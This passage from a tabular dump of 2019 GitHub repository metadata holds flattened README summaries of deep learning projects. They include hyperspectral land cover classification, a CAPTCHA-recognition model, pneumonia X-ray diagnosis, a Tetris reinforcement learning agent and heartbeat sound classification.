generates the landcover classification of an input hyperspectral image for a given trained network credibility ipynb summarizes the predictions of an ensemble and produces the land cover classification and class wise confusion matrix Setting up the experiment Download the Indian Pines data set from here https purr purdue edu publications 1947 1 Make a directory named Data within the current working directory and copy the downloaded mat files Indianpines mat and Indianpinesgt mat in this directory In order to make sure all codes run smoothly you should have the following directory subtree structure under your current working directory IndianPinesDataSetPreparationWithoutAugmentation ipynb DecoderSpatialCNN ipynb DecoderSpatialMLP ipynb IndianPinesCNN ipynb CNNfeed ipynb MLPfeed ipynb credibility ipynb IndianPinesCNN py IndianPinesMLP py Spatialdataset py patchsize py Data Indianpinesgt mat Indianpines mat Set the required patch size value eg 11 21 etc in patchsize py and run the following notebooks in order 1 IndianPinesDataSetPreparationWithoutAugmentation ipynb 2 CNNfeed ipynb OR MLPfeed ipynb specify the number of fragments in the training and test data in the variables TRAINFILES and TESTFILES 3 DecoderSpatialCNN ipynb OR DecoderSpatialMLP ipynb set the required checkpoint to be used for decoding in the modelname variable Outputs will be displayed in the notebooks Acknowledgement The project is funded by Satellite Applications Centre Indian Space Research Organization SAC ISRO http www sac gov in,2019-10-14T22:26:04Z,2019-10-14T22:47:06Z,Jupyter Notebook,kartikeyanegi,User,1,1,0,38,master,Santara#hbutsuak95#thisisashukla#kartikeyanegi,4,0,0,0,0,0,0
aurelien-m,HorizonNet,n/a,HorizonNet My attempt to make a self driving car with deep learning in Forza Horizon 4 developped with Python 3 7 works for Windows FH4 is not on Linux you need an xbox controller for now How to launch 1 To execute just type python capture py 2 It will then capture every second approximately a new image of the game and the inputs from the controller 3 The neural network is in development Example of a capture Image file ximage png Screen capture of FH4 data 9image png Inputs file inputs csv imagefile x y gas brake 0image png 4241 105 34 0 1image png 2968 779 101 0 2image png 10867 5289 88 0 x and y correspond to the coordinates of the joystick on the controller,2019-10-10T10:41:54Z,2019-10-31T22:48:14Z,Jupyter Notebook,aurelien-m,User,2,1,0,9,master,aurelien-m,1,0,0,0,0,0,0
soniatalati,chatbot-fun,n/a,chatbot fun Chatbot using deep learning and NLP for fun conversations,2019-10-26T04:58:12Z,2019-10-26T05:02:29Z,Python,soniatalati,User,1,1,0,3,master,soniatalati,1,0,0,0,0,0,0
zhangbo1997,style_transfer_method_comparison,n/a,styletransfermethodcomparison Full comparison of different style transfer methods in deep learning,2019-10-15T07:42:18Z,2019-10-16T18:08:09Z,Jupyter Notebook,zhangbo1997,User,1,1,0,2,master,zhangbo1997,1,0,0,0,0,0,0
nchams,Classifying-Pediatric-Skin-Condtions,n/a,Classifying Pediatric Skin Condtions Classifying Images of Pediatric Skin Conditions with Deep Learning,2019-10-13T22:10:09Z,2019-11-18T04:52:58Z,Jupyter Notebook,nchams,User,1,1,0,2,master,nchams,1,0,0,0,0,0,0
Bipinoli,Final-Year-Project-,n/a,Final Year Project Music Generation project using deep learning LSTM architecture Screenshot from 2019 09 14 09 38 51 https user images githubusercontent com 11765482 65815994 423d9200 e216 11e9 94c7 cbac82df03ed png Screenshot from 2019 09 14 09 38 50 https user images githubusercontent com 11765482 65815995 436ebf00 e216 11e9 863d edbecc014844 png Screenshot from 2019 09 14 09 38 39 https user images githubusercontent com 11765482 65815996 45388280 e216 11e9 93bc c8d62f7661ef png Screenshot from 2019 09 14 09 37 06 https user images githubusercontent com 11765482 65815997 47024600 e216 11e9 9e96 ceb58a3df2d8 png Screenshot from 2019 09 14 09 32 48 https user images githubusercontent com 11765482 65816000 4e295400 e216 11e9 97f0 a409b8fd26b0 png Screenshot from 2019 08 24 12 02 53 https user images githubusercontent com 11765482 65816001 508bae00 e216 11e9 9655 4b215ab4f0c1 png Screenshot from 2019 08 08 22 21 52 https user images githubusercontent com 11765482 65816004 55506200 e216 11e9 8458 615203ff8c3c png Screenshot from 2019 08 10 19 35 55 https user images githubusercontent com 11765482 65816005 57b2bc00 e216 11e9 84bd d6fcde667bbb png Screenshot from 2019 08 09 09 17 28 https user images githubusercontent com 11765482 65816006 58e3e900 e216 11e9 99d7 633dba9fc545 png Screenshot from 2019 08 10 19 36 14 https user images githubusercontent com 11765482 65816007 5a151600 e216 11e9 937b 1b69376f5e3d png tsne2dembeddings https user images githubusercontent com 11765482 65816009 5f726080 e216 11e9 8c83 ede73f75ccb1 png Screenshot from 2019 09 14 09 37 21 https user images githubusercontent com 11765482 65816011 65684180 e216 11e9 89fc 55d181e905fb png Screenshot from 2019 09 14 09 36 54 https user images githubusercontent com 11765482 65816012 66996e80 e216 11e9 8f64 315d2ae40ebd png Screenshot from 2019 09 14 09 25 24 https user images githubusercontent com 11765482 65816013 68fbc880 e216 11e9 94cc 97e68886af63 png Screenshot from 2019 09 14 09 37 06 https user images githubusercontent com 11765482 65816016 6b5e2280 e216 11e9 9e99 822e451ef851 png Screenshot from 2019 07 27 21 33 23 https user images githubusercontent com 11765482 65816019 73b65d80 e216 11e9 90d3 a8568f73975e png Screenshot from 2019 07 27 21 33 30 https user images githubusercontent com 11765482 65816020 744ef400 e216 11e9 9e13 d918849bff68 png finaloutput https user images githubusercontent com 11765482 65816024 7ca72f00 e216 11e9 83d8 3a4fdd9a114e png beforestructure https user images githubusercontent com 11765482 65816025 7dd85c00 e216 11e9 80cf f78c099d0eca png withbetterstrucuture https user images githubusercontent com 11765482 65816026 803ab600 e216 11e9 8ebd 417f723017d4 png,2019-09-28T11:43:02Z,2019-09-28T18:42:39Z,JavaScript,Bipinoli,User,1,1,0,2,master,Bipinoli,1,0,0,0,0,0,0
CSBG-LSU,BionoiNet,n/a,BionoiNet Classification of ligand binding sites with off the shelf deep neural networks Description BionoiNet is a deep learning based framework for ligand binding site classification It transforms 3 d structures of ligand binding sites into 2 d images and then these images are processed by a deep neural network DNN to generate classification results The pipeline of BionoiNet is shown below https github com CSBG LSU BionoiNet blob master figures BionoiNet PNG The 2 d images of ligand binding sites are generated using the Bionoi https github com CSBG LSU BionoiNet tree master bionoi software and the DNN is implemented with the APIs of Pytorch https pytorch org The datasets are divided into 5 folds for cross validation and the sequence identity between the training and validation sets is less than 20 Dependency Install the dependency package using this file dependency environment yml This denpendency file is exported by Anaconda https www anaconda com To install the environment conda env create f environment yml Folders bionoi a software that transforms ligand binding sites mol2 files into Voronoi diagrams bionoicnnhomologyreduced a convolutional neural network CNN trained on the Voronoi representations of ligand binding sites for classification bionoimlhomologyreduced machine learning baselinies to classifiy binding sites bionoiroc code to plot roc curves for classification dependency dependency python packages homologyreducedfolds files containing folds such that the sequence identity between train and validation is less than 20 Usage 1 Unzip the mol2 files located at homologyreducedfolds mols zip and the location of the data folder is datadir 2 Run Bionoi at bionoi imggen py to transform mol2 files to images and location of the image folder is imgdir python imggen py opMode controlvsnucleotide Note that the source folder of mol2 files and target folder of images need to be modified in the function gen48homologyreduced 3 Train the convolutional neural network CNN at bionoicnnhomologyreduced for cross validation python homologyreducedcnncvresnet18 py op controlvsnucleotide rootdir imgdir batchsize 32 resultfilesuffix 1thrun 4 Grab a cup of coffee and wait for results Cite our work,2019-10-01T20:48:20Z,2019-12-13T23:37:44Z,Python,CSBG-LSU,Organization,0,1,0,42,master,wentaoveggiebird,1,0,0,0,0,0,0
gr-b,foam-cutout-recognition,n/a,CS549 Computer Vision Final Project Deep Learning Approach Griffin Bishop Luke Ludington Nick St George Andrew Schueler Project Description In this project teams were tasked with recognizing an object In our case it was a collection of 5 foam sticker cutouts Since they were all the same color and uniform we decided not to do simple object recognition as this would be trivial to detect Instead we did multi class classification where we wanted to distinguish images of the 5 classes of foam cutouts provided We captured 3700 images of the cutouts using a robotic turntable in different lighting and distance conditions and then took 600 images of them in harder real world environments by hand for use as the validation set We used the VGG11 pre trained classification network fine tuning it on our robotically collected images Then we tested our model on the real world set of images We achieved an 83 43 accuracy on this set of images These are favorable results considering the baseline level of 16 6 Requirements 1 PyTorch 2 Python 3 7 3 Torchvision 4 About 6gb VRAM with current batch size of 24 You can use CPU or decrease the batch size however Usage 1 Use preprocessimages py to crop image resize raw images 1 Set up data Should have data train data val data test folders each with 6 subfolders 1 for each class 2 Run trainmulticlass py Note Comment out certain lines if not using GPU with cuda This will write a model pt to this directory 3 Run test py to test on the data test directory In order to run the model inference on an image feed with the first detectable camera run this script python3 videofeed py It will then run the classifier on the first camera available Make sure you have a camera and monitor available before running the script,2019-10-27T16:38:57Z,2019-12-10T14:53:00Z,Python,gr-b,User,3,1,1,38,master,thatrobotguy#gr-b,2,0,2,0,0,0,0
iamVarunAnand,Residual-Image-Denoising,n/a,,2019-09-29T18:12:04Z,2019-10-17T10:30:52Z,Jupyter Notebook,iamVarunAnand,User,1,1,0,2,master,iamVarunAnand,1,0,0,0,0,0,0
geekswaroop,CS224n-2017,cs224n#deep-learning#nlp#tensorflow,CS224n 2017 Winter My solutions for all the assignments for the Stanford Natural Language Processing with Deep Learning course,2019-10-11T11:35:04Z,2019-10-23T13:35:05Z,Python,geekswaroop,User,1,1,0,4,master,geekswaroop,1,0,0,0,0,0,0
argonne-lcf,DL-Profiling-Examples,n/a,DL Profiling Examples Example scripts and profiling demonstrations for deep learning models,2019-09-27T20:16:24Z,2019-10-06T11:58:25Z,Python,argonne-lcf,Organization,5,1,0,9,master,jtchilders#coreyjadams,2,0,0,0,0,0,0
hpc-ulisboa,gpuPTXModel,n/a,gpuPTXModel GPU Static Modeling using PTX and Deep Structured Learning Directory structure assemblyinfo files with Assembly ISA list of possible instructions and available modifiers benchmarks information on considered benchmarks including source code of the microbenchmarks datasets datasets used to train and validate the models gpuinfo files that characterize the architecture to be considered in the trained models number of freq domains number of levels in each domain etc modelconfigs configurations of the models src gpuPTXModel source auxiliary files Tools gpuPTXModel main command line tool that trains static models Performance Power Energy based on a given dataset for a specific GPU toolReadBenchs command line tool that reads dataset and aggregates in suitable format gpuPTXParser command line tool that can read PTX files and output the required information to be used in the proposed models 1 gpuPTXModel Tool gpuPTXModel is a command line tool that allows creating DVFS aware GPU static models based solely on the sequence of PTX https docs nvidia com cuda parallel thread execution index html instructions in the kernel code The proposed models published in IEEE Access https ieeexplore ieee org document 8890640 implemented using recurrent neural networks LSTM based take into account the sequence of GPU assembly instructions and can be used to accurately predict changes in the execution time power and energy consumption of applications when the frequencies of different GPU domains core and memory are scaled To train the models the tool receives as argument the path to the microbenchmark and optionally the testing dataset which need to have been properly aggregated using the toolReadBenchs https github com hpc ulisboa gpuPTXModel 2 toolreadbenchs tool tool If you use the gpuPTXModel tool in a publication please cite 1 4 references Usage bash gpuPTXModel py testdatapath device deviceid encoderfile timedvfsfile powdvfsfile energydvfsfile notimedvfs nopowdvfs noenergydvfs numepochs v Arguments PATH to the directory with the microbenchmark profilling data to be used in training name of the GPU device the dataset was executed on Options testdatapath PATH to the directory with the testing dataset to be later used for testing the models default device select the device where the training will execute default gpu deviceid target a specific device default 0 encoderfile name of the file with the encoder configuration default timedvfsfile name of the file with the Time FNN configuration default powdvfsfile name of the file with the Power FNN configuration default energydvfsfile name of the file with the Energy FNN configuration default notimedvfs to turn off Time FNN i e not use it nopowdvfs to turn off Power FNN i e not use it noenergydvfs to turn off Energy FNN i e not use it numepochs to select the maximum number of epochs to use during training default 20 v turn on verbose mode default False Example bash gpuPTXModel py Microbenchmarks Outputs device gpu modelname LSTM numlayers 2 learningrate 0 001 numepochs 50 2 toolReadBenchs Tool toolReadBenchs is a command line tool that can be used for reading the measured values execution times and power consumption and organizing them in the format that can be used by the main gpuPTXModel tool The tool also creates pdf files with the plots of the measured values across the different frequency levels If you use the toolReadBenchs tool in a publication please cite 1 4 references Usage bash toolReadBenchs py benchsfile testdatapath benchstestfile tdp o v Arguments PATH to the directory with the microbenchmark dataset to be later used for training validation the models name of the GPU device the dataset was executed on Options benchsfile provide file with names of the microbenchmarks default all testdatapath PATH to the directory with the testing dataset to be later used for testing the models default benchstestfile provide file with names of the testing benchmarks default all tdp give TDP value of the GPU device default 250 o create output file with the aggregated datasets default False v turn on verbose mode default False Example bash toolReadBenchs py Outputs Microbenchmarks GTXTitanX gtxtitanx benchsfile benchsall txt testdatapath Outputs RealBenchmarks GTXTitanX benchstestfile benchsrealbest txt o 3 gpuPTXParser Tool gpuPTXParser is a command line tool that can be used for reading PTX https docs nvidia com cuda parallel thread execution index html files and extracting the number of occurrences of each different instructions per GPU kernel The tool can also extract the sequence of instructions of the kernels in the source file If you use the gpuPTXParser tool in a publication please cite 1 4 references Usage bash gpuPTXParser py histogram v Arguments PATH to the directory with the isa files ptxisa txt ptxstatespaces txt ptxinstructiontypes txt ptx file to be parsed Options histogram output a pdf file with the histogram of instructions used per kernel default False v turn on verbose mode default False Example bash gpuPTXParser py auxfiles Microbenchmarks pureDRAM DRAM ptx histogram Output Files outputOccurrencesperkernel csv file with the count of occurrences of each instruction in the PTX ISA in each kernel from the parsed ptx file 1 row for each kernel 1 column for each instruction outputSequenceReadablekerneli csv file for each kernel i in the parsed ptx file outputSequencekerneli csv file for each kernel i in the parsed ptx file Values encoded 4 REFERENCES 1 Jo o Guerreiro Aleksandar Ilic Nuno Roma Pedro Toms GPU Static Modeling Using PTX and Deep Structured Learning https ieeexplore ieee org document 8890640 IEEE Access Volume 7 November 2019 Dependencies Python 3 https www continuum io downloads PyTorch 1 2 0 http pytorch org Contact If you have problems questions ideas or suggestions please contact us by e mail at joao guerreiro inesc id pt Author Jo o Guerreiro joaofilipedg https github com joaofilipedg,2019-10-15T16:21:02Z,2019-11-06T13:37:54Z,Cuda,hpc-ulisboa,Organization,1,1,0,26,master,joaofilipedg,1,0,0,0,0,0,0
pawoody,DL_street_signs,n/a,Classifying street signs using Deep Learning Background Motivation According to the National Safety Council https www nsc org road safety safety topics fatality estimates approximately 40 000 people died in automotive accidents in the United States in 2018 Since the invention of the automobile manufacturers have steadily added more safety features and improved car design over time with the goal of keeping drivers safer on the road Automotive manufacturers have spent millions of dollars researching safety improvements for seatbelts tires and pretty much every car piece or part imaginable Despite all of this investment driving remains substantially more fatal than alternatives such as air travel https www theguardian com world 2019 jan 02 plane crash deaths jump sharply in 2018 but fatalities still rare in 2019 src http yonah org channel visionhack computer vision russia computervisionexample jpg Image Source yonah org While there are many factors that likely contribute to this drastic difference such as the varying difficulty in training and certification required to be a commercial pilot vs obtaining a drivers licence the difference in mortality rate remains staggering In fact there were a total of 500 deaths resulting from plane crashes recorded globally in 2018 that s 80 times fewer deaths when compared to car crash fatalities in the US only Through the advent of artificial intelligence we re now able to apply new techniques to many old problems including automotive safety Today companies such as Tesla Volvo and many others are investing into technology such as Artificial Intelligence that seeks to correct the root cause of the issue and the one we ve previously ignored human performance behind the wheel Perhaps the most exciting advancement in automative technology since the invention of the car itself is the birth of the self driving or autonomous car Once the topic of Science Fiction Convolutional Neural Networks CNNs and other modeling techniques have pushed the bounds of possible into the realm of human imagination There are 3 major challenges we must overcome in order to make self driving technology possible We must be able to do the following very quickly 1 Obtain the data sensors cameras 2 Process the data artificial intelligence our focus here 3 Act on the data drive the car Self Driving Car Sensor Example SelfDriveCarSensors jpg Image courtesy of https www sae org In this experiment we ll focus exclusively on a simplified application of step 2 processing image data in order to determine what it is we re looking at in this case street signs To accomplish this goal 100 000 images containing 43 labeled pre classified street signs were used to train supervised Deep Learning models that utilized CNNs and Transfer Learning to classify each type of street sign Adhering to the OSEMN https medium com breathe publication life of data data science is osemn f453e1febc10 pipeline we will load image label data pre process scrub image data and visualize any trends and noteworthy distributions amongst features target variables in the dataset prior to modeling Following exploratory data analysis we ll use Deep Learning methods CNNs and Transfer Learning to classify the street signs in the database When evaluating the results of our models it is important to consider the potential ramifications of a mistake In the case of self driving cars a misidentified stop sign or pedestrian could cost a life However for the purposes of this inquiry we will not define an acceptable margin of error In a future study the importance of misclasification of each sign could be evaluated given a weight and the experiment should be repeated In this way a new model could be trained to err on the side of caution when classifying more critical street signs Additionally the ethics behind these choices should be evaluated If our weighted inputs caused our new model to make fewer mistakes classifying stop signs for example but performed slightly worse on classifying pedestrian crossing signs would that be acceptable These are the types of evaluations that must be considered before we hand over the keys entirely To improve the experiment further additional sign data could be generated using Generative Adversarial Networks GANs and used to improve model performance Based on model performance fatality could then be predicted using available crash statistics in order to give context to the performance of each model Before beginning our modeling and analysis we ll briefly discuss how convolutional neural networks allow us to train computers to identify objects As humans when we look at a picture like the example below we see a cute dog with black and grey fur Without thought we know that the subject of the image isn t a horse car or cat img IMG6417 jpg Even when viewing an example of a heavily edited photo I took as humans we still have no difficulty in identifying that the subject of the image is a dog even though he is blue Take a look img IMG1469 jpg Computers unsurprisingly have no notion of what a dog is much less what one looks like Instead computers see images as grouped matrices called tensors In each matrix each number corresponds to a specific pixel in the image Put simply an image with the dimensions of 32x32x3 contains 3 matrices representing the Red Green and Blue color channels that are 32 pixels in height and 32 pixels in width Using a convolutional neural network we are able to train models to extract image features such as edges shapes and colors Using supervised learning techniques we can pass thousands of images of dogs of all breeds through a model in order to teach the computer what a dog looks like So while a computer may not appreciate how cute my dog Oliver is by applying different filters to his portrait it can determine that Oliver s facial structure color and shape share similarities with other dogs gif Oliver gif In the links below we ll explore these techniques discussed here and create models that classify street signs into 43 target classes Notebooks Links of Interest Modeling trafficsignsmodeling ipynb Image pre processing imagepreprocessing ipynb,2019-10-28T18:03:38Z,2019-11-26T17:21:23Z,Jupyter Notebook,pawoody,User,1,1,1,9,master,pawoody,1,0,0,0,0,0,0
deeplearningunb,pneumonia-diagnosis,computer-vision#deep-learning#tensorflow,Pneumonia Diagnosis from Chest Ray A Tensorflow 2 0 implementation About this project We are Software Engineering students from University of Brasilia UnB Brazil We take great interest in artificial inteligence and we are excited to help the worldwide comunity in any way we can But for this specific project we d like to make the difference by helping doctors to diagnose whether a patient has pneumonia or not Our main objectives As we develop this project we want to put our aquired AI habilities during our carrer and during our classes in practice Also we want to provide the open source community and our fellow students the opportunity to work in a reasonable and important project as they can become contibutors Our goal We d like to make the difference by helping doctors to diagnose whether a patient has pneumonia or not The problem Effectively diagnose pneumonia just by looking to chest x ray images Our solution Develop AI algorithms using artificial neural networks to help diagnose pneumonia from x ray images of a patient s chest Members and stakeholders Members Name github email Gabriel Ziegler gabrielziegler3 gabrielziegler3 gmail com Erick Giffoni ErickGiffoni giffoni erick gmail com Fernando Aguilar fernand0aguilar fernando aguilar hotmail com br Davi Alves davialvb davialvb gmail com Stakeholders Doctors in general Patients in general Kaggle dataset Content The dataset is organized into 3 folders train test val and contains subfolders for each image category Pneumonia Normal There are 5 863 X Ray images JPEG and 2 categories Pneumonia Normal Chest X ray images anterior posterior were selected from retrospective cohorts of pediatric patients of one to five years old from Guangzhou Women and Childrens Medical Center Guangzhou All chest X ray imaging was performed as part of patients routine clinical care For the analysis of chest x ray images all chest radiographs were initially screened for quality control by removing all low quality or unreadable scans The diagnoses for the images were then graded by two expert physicians before being cleared for training the AI system In order to account for any grading errors the evaluation set was also checked by a third expert Dependencies Docker Docker compose Usage Run the following in the command line docker compose up Datasets 1 https www kaggle com paultimothymooney chest xray pneumonia,2019-10-16T00:18:22Z,2019-12-07T11:07:18Z,Jupyter Notebook,deeplearningunb,Organization,2,1,0,34,master,gabrielziegler3#fernand0aguilar#ErickGiffoni#davialvb,4,0,0,1,17,0,5
wahlby-lab,InSilicoTFM,n/a,License https img shields io github license wahlby lab insilicotfm style flat square https opensource org licenses MIT https img shields io badge python 3 6 blue svg style flat square https www python org download releases 3 6 0 In Silico Prediction of Cell Traction Forces Prediction Cell Traction forces with Deep Learning The code will be uploaded any time soon The paper is available on Arxiv https arxiv org abs 1910 07380 Table of Contents Introduction introduction Example example Quick Start Guide quick start guide Citation citation Acknowledgements acknowledgements Introduction Traction Force Microscopy is a method to determine the tensions a biological cell conveys to the underlying surface Typically Traction Force Microscopy requires culturing cells on gels with fluorescent beads followed by bead displacement calculations We present a new method allowing to predict those forces from a regular fluorescent image of the cell Using Deep Learning we trained a Bayesian Neural Network adapted for pixel regression of the forces and show that it generalises on different cells of the same strain The predicted forces are computed along with an approximated uncertainty which shows whether the prediction is trustworthy or not Using the proposed method could help estimating forces in the absence of non trivial calculation of bead displacements and can also free one of the fluorescent channels of the microscope This repository gives you access to the code necessary to Train a Bayesian Neural Network for Traction Force prediction Test the neural network on other cell datasets Generate the figures present in the published paper Example Video links Quick Start Guide Trying the traction force prediction out We set up a Colab notebook for you to try predicting the traction forces on any images of your choice The computation is done on the cloud for free no need to install anything Get started in 15 seconds You can access the notebook at the following address https colab research google com drive 16eX9UOFn4cQCL6hqcxgiX5QEm8yAhTaR Training the neural network bash git clone https github com wahlby lab InSilicoTFM git pipenv install jupyter notebook Citation Please cite the following paper if you are using or contributing to our method Nicolas Pielawski Jianjiang Hu Staffan Strmblad and Carolina Whlby In Silico Prediction of Cell Traction Forces arXiv preprint arXiv 1910 07380 2019 articlepielawski2019insilicotfm title In Silico Prediction of Cell Traction Forces author Pielawski Nicolas and Hu jianjiang and Str omblad Staffan and W ahlby Carolina journal arXiv preprint arXiv 1910 07380 year 2019 Acknowledgements This repository contains the Roboto font designed by Christian Robertson published under the Apache 2 0 license https fonts google com specimen Robotogo,2019-10-13T08:45:39Z,2019-10-24T09:00:31Z,Jupyter Notebook,wahlby-lab,Organization,1,1,0,8,master,npielawski,1,1,1,0,0,0,0
amitrajitbose,dog-breed-classifier,computer-vision#deep-learning#dog-breed-classifier#image-classification#object-detection#pytorch,Dog Breed Classification Cover Picture https storage googleapis com kaggle competitions kaggle 3333 media bordercollies png An effective deep learning model based on VGG 16 and RESNET50 architectures to classify any dog image from 133 different classes of dogs Added advantage you can pass images of humans as well It is intelligent enough to classify between a human and a dog as too Usage python3 script py Example python3 script py home mypc Desktop pexels photo 356378 jpeg IMAGE PATH home mypc Desktop pexels photo 356378 jpeg This is dog Your breed is most likely CANAAN DOG VGG 16 Architecture https neurohive io wp content uploads 2018 11 vgg16 1 e1542731207177 png RESNET 50 Architecture https eenews cdnartwhere eu sites default files styles innerarticle public sites default files images resnet50630 jpg Scope Of Improvement Classify images by passing URLs directly Develop a stable and robust REST API Current accuracy of Dog Breed Classification Sub Model 81 This can be improved,2019-10-26T14:52:29Z,2019-10-28T15:49:46Z,Jupyter Notebook,amitrajitbose,User,2,1,0,4,master,amitrajitbose,1,0,0,0,0,0,0
arpitj07,CAPTCHA-BREAKER,n/a,CAPTCHA BREAKER CAPTCHAs were designed to prevent computers from automatically filling out forms by verifying that you are a real person But with the rise of deep learning and computer vision they can now often be defeated easily Content Dependencies https github com arpitj07 CAPTCHA BREAKER blob master README md dependencies Dataset https github com arpitj07 CAPTCHA BREAKER blob master README md dataset Prepocessing https github com arpitj07 CAPTCHA BREAKER blob master README md prepocessing Training https github com arpitj07 CAPTCHA BREAKER blob master README md training Testing Predictions https github com arpitj07 CAPTCHA BREAKER blob master README md testing predictions Visaulisation https github com arpitj07 CAPTCHA BREAKER blob master README md visualization Dependencies This project requires a lot of modules and packages This can be installed from requirement txt file using following command pip install r requirements txt for python 2 x pip3 install r requirements txt for python 3 x NOTE IF YOU GET WARNING REGARDING CPU USAGE SET os environ TFCPPMINLOGLEVEL 2 Dataset Data for the project is available on Kaggle https www kaggle com fournierp captcha version 2 images We can download to our local system using pyton script downloadimages py Data will be downloaded to Dataset folder Run the following command python downloadimages py Prepocessing The raw data need to be prepocessed before feeding into the model All the code for the same is provided in utils py Training After downloading data prepocessing images and labels we will train the model We need to provide 2 arguments 1 Path to Input images 2 Path to save the model To train run the command python trainmodel py dataset Dataset model Output Testing Predictions Final step is to test your model Pass the following arguments and run the code from testmodel py 1 Input Dataset to predict 2 Model path to Saved model python testmodel py input Datasets model Output savedmodel pb Visualization To view the architechture and training graphs use Jupyter Notebook captcha breaker tensorflow ipynb,2019-10-09T17:07:30Z,2019-12-03T10:22:31Z,Jupyter Notebook,arpitj07,User,1,1,1,6,master,arpitj07,1,0,0,0,0,0,0
gaddisa,Human-Activity-Recognition,n/a,Human Activity Recognition Human Activity Recognition from Mobile Sensor Data Using Deep Learning Tools Required Python 3 5 Tensorflow Numpy Matplotlib andc Pandas are used during development,2019-09-23T09:58:35Z,2019-10-04T02:43:09Z,Python,gaddisa,User,1,1,0,7,master,gaddisa,1,0,0,0,0,0,0
JohnnyTh,pytorch_multiproject,n/a,Pytorch Multproject The main idea behind this project is to create a generic foundation upon which customized pytorch projects can be built This means implementing abstract base classes as well as generic classes for the key elements found in any PyTorch projects such as Dataset and Trainer classes The repo includes several implemented Deep Learning projects demonstrating usage of these concepts in practice Version history Version 0 2 0 Implemented CycleGAN for several tasks based on the following Paper https arxiv org pdf 1703 10593 pdf The tasks include unpaired image to image translation for horse zebra mnist svhn and old young datasets Cycle Generative Adversarial Networks Implementation of CycleGAN drawing architecture training details from the Repo https github com junyanz pytorch CycleGAN and pix2pix Cycle GAN is a neural network architecture proposed by Jun Yan Zhu et al 2018 in the paper titled Unpaired Image to Image Translation using Cycle Consistent Adversarial Networks As explained by the authors CycleGAN consists of two generators AB and BA that perform translation of images from domain A to domain B and vice versa and two discriminators that encourage the respective generators to learn the correct translation The paper introduced cycle consistency loss that imposes additional constraint on the mapping learned by generators that allows usage of unpaired training data Tested on several datasets with varying performance Horse Zebra dataset One of the datasets originally suggested by authors The results in this implementation after 200 epochs of training were as follows MNIST SVHN dataset This task was done using built in torchvision MNIST Modified National Institute of Standards and Technology database and SVHN Street View House Numbers datasets Old Young dataset Image to Image translation was done on two subsets of human faces old and young extracted from IMDB WIKI dataset https data vision ee ethz ch cvl rrothe imdb wiki The datasets were preprocessed and balanced by gender prior to training in order to improve the quality of the final results see the details of preprocessing at pytorchmultiproject utils agegenderpreprocessing py Version 0 1 0 Implemented all basic features basic and generic classes for trainers unit tests for important modules logging of results Generic trainer was implemented with serialization deserialization and cycling through epochs methods Additionally two custom projects were added First project is a simple NN for MNIST classification task based on the Author s previous work https github com JohnnyTh MNISTconvnetpytorch The second project uses transfer learning to re purpose a pre trained model for age and gender classification task Source images for training were taken from IMDB WIKI dataset more precisely only WIKI part Link to the dataset description https data vision ee ethz ch cvl rrothe imdb wiki Link to the dataset https data vision ee ethz ch cvl rrothe imdb wiki static wikicrop tar TODOs More models semantic segmentation object detection image denoising NLP models Structure pytorch multiproject data data related classes and operations customtransforms py tranforms for use with Dataset class cycleganagedataset py class for image to image translation using GAN for old young dataset cyclegandataset py class for image to image translation from domain A to B and vice versa using GAN inherits from generic cyclegandatasetsmall py class for image to image translation using GAN for MNIST SVHN datasets inherits from generic genderagedataset py class for age and gender classfication task inherits from generic genericdataset py generic class for basic data operations inherits from PyTorch Datset logger module for logging logger py loggerconfig json models models losses and metrics agegendermodel py Neural network model for age and gender classification cycleGAN py NN model optimizer lrscheduler for Cycle Generative Adversarial Network mnistmodel py Neural network model for MNIST dataset classififcation projects actual DL projects created using the tools provided in repo CycleGAN implemetations of Cycle Generative Adversarial Network age json hyperparameters for old young task agetest py test script for old young task agetrain py train script for old young task small json hyperparameters for MNIST SVHN task smalltest py test script for MNIST SVHN task smalltrain py train script for MNIST SVHN task test py test script for general for horse zebra task train json hyperparameters for horse zebra task train py train script for horse zebra task genderagemodel model for age and gender classification task train json train py main script to start training mnist MNIST dataset classififcation model train json train py main script to start training resources default directory for storing input datasets saved trained models and test data are saved here tests unit tests trainers base generic and custom trainers agegendertrainer py basetrainer py cyclegantrainer py generictrainer py mnisttrainer py utils small utility functions util py agegenderpreprocessing py downloads and pre processes the data for gender age classifier and cycle GAN ganhorses dataset py downloads horse zebra dataset for cycle GAN Running unit tests Example pytest basetrainer py Prerequisites Python 3 CPU or NVIDIA GPU supporting CUDA and CuDNN Dependencies torch 1 2 0 torchvision numpy 1 17 pandas 0 24 2 pytest 4 3 1 requests 2 22 0 scikit image 0 14 2 scikit learn 0 20 3 mock 3 0 5 tqdm 4 37 0 Author Maksym Tatariants JohnnyTh https github com JohnnyTh,2019-10-21T10:52:49Z,2019-11-30T15:22:06Z,Python,JohnnyTh,User,1,1,0,159,master,JohnnyTh,1,0,0,0,0,0,0
SimBe195,TetrisAI,n/a,TetrisAI Trying to solve Tetris with Deep Reinforcement Learning For each state s we assign the value Q s maxa in A s R s a gamma Q S s a where A s are the possible actions in state s i e the possible positions where the current tetromino can be placed R s a is the reward for taking action a in state s gamma is a real valued discount factor and S s a is the successor state when taking action a in state s This ai is a feed forward neural network that tries to model the values for Q s using a representation of state s as its input and plays by taking the action a in state s for which R s a gamma Q S s a is maximal Usage execute python Main py Important arguments include ai human for toggling ai human play render norender for toggling a visual representation of the game epoch for starting of with a model that was saved after epochs of training Other arguments and hyperparameters can be found by calling python Main py h Requirements Tensorflow I used version 1 14 0 tkinter,2019-10-11T13:09:56Z,2019-11-04T12:05:29Z,Python,SimBe195,User,1,1,0,14,master,SimBe195,1,0,0,0,0,0,0
MananAgarwal,Heartbeat-Classifier,convolutional-neural-networks#deep-learning#healthcare#jupyter-notebook#python#signal-processing,Heart Anomaly Detection by Analysing Stethoscope sounds using Deep Learning In this work we take stethoscope sounds and also heartbeat sounds recorded using the microphone of a mobile phone as input and apply deep learning to the task of automated cardiac auscultation i e recognizing abnormalities in heart sounds We describe a novel algorithm which first transforms the one dimensional time series inputs into a two dimensional time frequency Melspectrograms It then trains a 4 layer CNN model on the MFCC Mel Frequency Cepstral Coefficients obtained from the Melspectrograms The trained network automatically distinguish between normal and abnormal heartbeat sound inputs We did not use any other time sequence based Neural Networks such as RNNs since the temporal behavior of the heartbeat was repeated within the window of observation and different sequential patterns were not needed to be learnt Our goal is to provide a reliable fast and low cost system that can be used by untrained frontline health workers or anyone with internet access to help determine whether an individual should be referred for expert diagnosis particularly in areas where access to clinicians and medical care is limited This will also help in early diagnosis of CVDs which will drastically decrease the potential risk factors of these deaths To classify a heartbeat sound The heartbeat audio file must be in wav format 1 Download the repository 2 Open the terminal command prompt and cd to the downloaded repository 3 Run the python script testing py python testing py 